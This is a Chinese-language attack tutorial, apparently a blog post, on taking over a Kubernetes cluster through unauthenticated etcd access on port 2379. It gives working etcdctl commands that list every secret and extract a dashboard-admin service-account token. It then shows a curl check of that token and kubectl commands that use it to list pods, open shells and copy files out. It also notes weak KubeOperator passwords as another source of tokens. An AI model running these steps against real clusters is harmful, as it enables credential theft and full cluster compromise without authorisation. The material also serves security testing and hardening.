在安装完 K8s 后，默认会安装 etcd 组件，etcd 是一个高可用的 key-value 数据库，它为 k8s 集群提供底层数据存储，保存了整个集群的状态。大多数情形下，数据库中的内容没有加密，因此如果黑客拿下 etcd，就意味着能控制整个 K8s 集群。

**etcd 未授权访问**

如果目标在启动 etcd 的时候没有开启证书认证选项，且 2379 端口直接对外开放的话，则存在 etcd 未授权访问漏洞。

访问目标的 <https://IP:2379/version> 或 <https://IP:2379/v2/keys>，看看是否存在未授权访问。如果显示如下，则证明存在未授权访问。

![image-20231222085653333](https://s2.loli.net/2024/01/25/etuyjGV6RZ5xdS8.png)

### 1.查找token

需要使用到 etcd 命令行连接工具：[etcdctl](https://etcd.io/docs/v3.4/install/)

由于 Service Account 关联了一套凭证，存储在 Secret 中。因此我们可以过滤 Secret，查找具有高权限的 Secret，然后获得其 token 接管 K8s 集群

查找所有的secret
===========

ETCDCTL\_API\\=3 ./etcdctl --insecure-transport\\=false --insecure-skip-tls-verify --endpoints\\=<https://172.16.200.70:2379/> get / --prefix --keys-only|sort|uniq| grep secret

![image-20231222090234172](https://s2.loli.net/2024/01/25/Hej8XtLJ3vnB4MW.png)

从返回的数据中挑选出一个具有高权限的 role 并读取其 token，以 /registry/secrets/kube-system/dashboard-admin-token-c7spp 为例，其中 kube-system 代表 namespace、dashboard-admin 是 clusterrole

查找指定secret保存的证书和token
=====================

ETCDCTL\_API\\=3 ./etcdctl --insecure-transport\\=false --insecure-skip-tls-verify --endpoints\\=<https://172.16.200.70:2379/> get /registry/secrets/kube-system/dashboard-admin-token-c7spp

![image-20231222090606284](https://s2.loli.net/2024/01/25/p4IxWrZoeTO2Klz.png)

复制 token，最后的 token 为 token? 和 #kubernetes.io/service-account-token 之间的部分

![image-20231222112025096](https://s2.loli.net/2024/01/25/vCPtVz31HEs9yj6.png)

如果机器上安装了 KubeOperator 存在弱口令，登录之后可以在集群中获取管控 token

![image-20231222113634553](https://s2.loli.net/2024/01/25/zo3b5ndCps2J7gB.png)

如果不知道 server api 可以通过 webkubectl 获取

kubectl cluster-info

![image-20231222113822617](https://s2.loli.net/2024/01/25/SElWc4ufJhzY9pa.png)

### 2.验证token有效性

curl --header "Authorization: Token" -X GET <https://172.16.200.70:6443/api> -k

### 3.使用 kebuctl 去执行命令

这里直接指定 token 去执行命令，或者可以通过制作配置文件指定配置文件来执行但是比较复杂

kubectl --insecure-skip-tls-verify -s <https://127.0.0.1:6443/> --token\\="\[ey...\]" -n kube-system get pods

![image-20231222112738092](https://s2.loli.net/2024/01/25/nrod5gSDMm1fuzb.png)

kebuctl 常用命令

\# 查看所有的资源信息

kubectl get all

kubectl get --all-namespaces

\# 获取pods列表

kubectl get pods -o wide --all-namespaces

-n 指定命令空间

-o wide 展示详细信息

\# 执行命令

kubectl exec -it podsname -n namespace -- command

\-- bash 进入 shell

\# 下载文件

kubectl cp -n 命名空间 pod名字:/data/1.hprof(在pod中要下载文件的路径) (本地保存文件的路径)

学习文章

- [K8s集群安全攻防(上)](https://xz.aliyun.com/t/12921#toc-0)
- [K8s集群安全攻防(下)](https://xz.aliyun.com/t/12930)<https://xz.aliyun.com/t/12930>